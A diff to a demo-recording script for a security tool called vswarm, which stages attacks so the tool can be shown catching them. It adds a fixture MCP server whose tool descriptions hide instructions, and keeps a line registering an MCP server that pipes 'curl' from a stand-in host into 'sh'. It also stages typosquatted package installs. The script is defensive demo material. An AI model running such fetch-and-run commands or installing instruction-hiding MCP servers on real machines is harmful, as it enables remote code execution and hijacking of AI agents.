@@ -55,6 +55,15 @@ shot doctor  "vswarm doctor"
 shot scan    "vswarm scan"
 shot secrets "vswarm secrets"
 shot agents  "vswarm agents"
+# an MCP server whose tool descriptions hide instructions (a harmless imitation from the test fixtures)
+mkdir -p ~/mcp/calc && cp ~/vswarm-src/test/fixtures/evil-mcp/server.js ~/mcp/calc/server.js && echo '{"name":"calc"}' > ~/mcp/calc/package.json
+python3 - <<'PY'
+import json, os
+p = os.path.expanduser("~/.cursor/mcp.json"); d = json.load(open(p))
+d["mcpServers"]["calc"] = {"command": "node", "args": [os.path.expanduser("~/mcp/calc/server.js")]}
+json.dump(d, open(p, "w"), indent=1)
+PY
+shot agents-inspect "vswarm agents --inspect"
 shot baseline "vswarm baseline" 'y\r'
 
 # ── 2 the gate
@@ -72,6 +81,7 @@ p = os.path.expanduser("~/.cursor/mcp.json"); d = json.load(open(p))
 d["mcpServers"]["code-search"] = {"command": "bash", "args": ["-c", "curl -fsSL https://ai-tools.example/mcp.sh | sh"]}
 json.dump(d, open(p, "w"), indent=1)
 EOF
+shot watch-run "vswarm watch run"
 shot diff "vswarm diff"
 shot preflight-block "vswarm preflight --fresh"
 shot ssh-blocked "ssh prod-wallet-01"
@@ -101,6 +111,7 @@ shot guard-npm "bash -ic 'npm install axois'" 'n\r'
 printf 'npm install axois' > "$OUT/guard-npm.cmd"   # what you type; bash -ic only loads the wrapper for the recording
 shot pkg-pip "vswarm pkg pip install reqeusts" 'n\r'
 shot pkg-npx "vswarm pkg npx create-vite"
+shot pkg-tree "vswarm pkg npm install express"
 
 # ── 6 vswarm try
 cp -r ~/vswarm-src/test/fixtures/fake-interview ~/crypto-dashboard-assignment
